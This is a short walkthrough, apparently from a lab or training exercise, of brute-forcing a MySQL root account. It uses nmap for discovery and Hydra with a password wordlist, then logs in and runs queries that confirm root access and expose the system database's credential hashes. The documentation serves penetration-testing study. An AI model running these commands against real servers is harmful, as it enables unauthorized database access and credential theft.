# MySQL Brute-Force (Port 3306)

MySQL requires a username + password pair for authentication, and the `root` account is targeted by default. In this attack, **Hydra** was used to brute-force the root account's password against a wordlist. A successful login grants access not just to a terminal, but to the target's **entire database content** — including other users' credential hashes.

## Discovery

| Command | Description |
|---|---|
| `nmap -A -p- -T5 [target IP]` | Detects MySQL (port 3306) as open, retrieving version information (5.0.51a) |

## Attack

| Command | Description |
|---|---|
| `hydra -l root -P /usr/share/wordlists/mysql_password.txt mysql://[target IP]` | Tries the root account's password against the wordlist, stopping once a successful match is found |

## Verification

| Command | Description |
|---|---|
| `mysql -h [target IP] -u root -p'[found password]' --skip-ssl` | Connects using the found credential (`--skip-ssl` is required since modern clients attempt an SSL handshake by default, which the legacy server can't respond to) |
| `SELECT current_user();` | Returns `root@%` — confirms root access from any host |
| `SELECT version();` | Confirms the server version (5.0.51a-3ubuntu5) |
| `SHOW DATABASES;` | Lists accessible databases, including the `mysql` system database (meaning access to other accounts' credential hashes) |
